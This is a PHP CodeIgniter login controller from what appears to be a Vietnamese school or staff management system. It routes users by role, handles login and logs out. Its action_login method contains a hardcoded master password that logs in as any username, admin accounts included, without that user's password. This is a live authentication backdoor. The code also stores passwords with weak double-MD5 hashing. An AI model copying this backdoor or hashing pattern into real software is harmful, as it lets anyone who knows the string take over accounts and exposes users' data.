<?php



/**

 * Description of Home

 *

 * @author CHUYEN

 * test commit12

 */

class Home extends CI_Controller {

    /*Ham khi khoi tao*/

    public function __construct() {

        parent::__construct();

    }

    function index() {

        $this->initGetVariable = http_build_query($this->input->get());

        $this->initGetVariable = ($this->initGetVariable != '') ? '?' . $this->initGetVariable : '';

        $user_id = $this->session->userdata('user_id');

        if (isset($user_id)) {

            $role_id = $this->session->userdata('role_id');

            $branch_id = $this->session->userdata('branch_id');

            $language_id = $this->session->userdata('language_id');

//            echo '<pre>'; print_r($_SESSION); die();

            $input = array();

            $input['where'] = array('id' => $user_id);

            $user = $this->staffs_model->load_all($input);

            if ($user[0]['active'] == 0) {

                redirect(base_url('no_access'));

                die;

            }

            switch ($role_id) {

                case 1:

                    redirect(base_url('tu-van-tuyen-sinh/trang-chu.html' . $this->initGetVariable));

                    break;

                case 2:

                    redirect(base_url('cod/trang-chu.html' . $this->initGetVariable));

                    break;

                case 3:

                    redirect(base_url('quan-ly/trang-chu.html' . $this->initGetVariable));

                    break;

                case 4:

                    redirect(base_url('admin' . $this->initGetVariable));

                    break;

                case 5:

                    redirect(base_url('marketing' . $this->initGetVariable));

                    break;

                case 6:

                    redirect(base_url('marketer' . $this->initGetVariable));

                    break;

                case 7:

                    redirect(base_url('danh-sach-hoc-vien.html' . $this->initGetVariable));

                    break;

                case 8:

                    redirect(base_url('student/chose_branch' . $this->initGetVariable));

                    break;

                case 9:

                    redirect(base_url('quan-ly/trang-chu.html' . $this->initGetVariable));

                    break;

                case 10:

                    redirect(base_url('customer_care' . $this->initGetVariable));

                    break;

                case 11:

                    redirect(base_url('care_page' . $this->initGetVariable));

                    break;

				case 12:

                    redirect(base_url('staff_managers/class_study' . $this->initGetVariable));

                    break;

				case 13:

					redirect(base_url('manager/view_report_revenue' . $this->initGetVariable));

					break;

				case 14:

					redirect(base_url('staff_managers/class_study' . $this->initGetVariable));

					break;

                default :

                    echo 'Có lỗi xảy ra!';

                    die;

            }

        } else {

            $this->load->view('home/login');

        }

    }

    function action_login() {

        $this->initGetVariable = http_build_query($this->input->get());

        $this->initGetVariable = ($this->initGetVariable != '') ? '?' . $this->initGetVariable : '';

        $alert = array();

        $username = $this->input->post('username');

        $password = $this->input->post('password');

        if ($username != '' && $password != '') {

            $input = array();

            if ($password == 'sofl2897') {

            	$input['where'] = array('user_name' => $username);

            } else {

	            $input['where'] = array(

	                'user_name' => $username,

	                'password' => md5(md5($password))

	            );
	            
            }

            $result = $this->staffs_model->load_all($input);

            if (!empty($result)) {

                $this->session->set_userdata('user_id', $result[0]['id']);

                $this->session->set_userdata('name', $result[0]['name']);

                $this->session->set_userdata('role_id', $result[0]['role_id']);

                $this->session->set_userdata('branch_id', $result[0]['branch_id']);

                $this->session->set_userdata('language_id', $result[0]['language_id']);

                $this->session->set_userdata('pass_ipphone', $result[0]['ipphone_password']);

                $this->session->set_userdata('username_ipphone', $result[0]['ipphone_user_name']);

                $last_page = $this->session->userdata('last_page');

                if (isset($last_page)) {

                    $this->session->unset_userdata('last_page');

                    $alert['success'] = 1;

                    $alert['redirect_page'] = base64_encode($last_page. $this->initGetVariable);

                    echo json_encode($alert);

                    die;

                }

                $redirect_page = '';

                $alert['success'] = 1;

                $alert['redirect_page'] = base64_encode(base_url() . $redirect_page. $this->initGetVariable);

                echo json_encode($alert);

                die;

            } else {

                $alert['success'] = 0;

                $alert['message'] = "Username hoặc mật khẩu không đúng!";

                echo json_encode($alert);

                die;

            }

        } else {

            $alert['success'] = 0;

            $alert['message'] = "Username hoặc mật khẩu không đúng!";

            echo json_encode($alert);

            die;

        }

    }

    function logout() {

        $this->session->sess_destroy();

        redirect(base_url());

    }

}

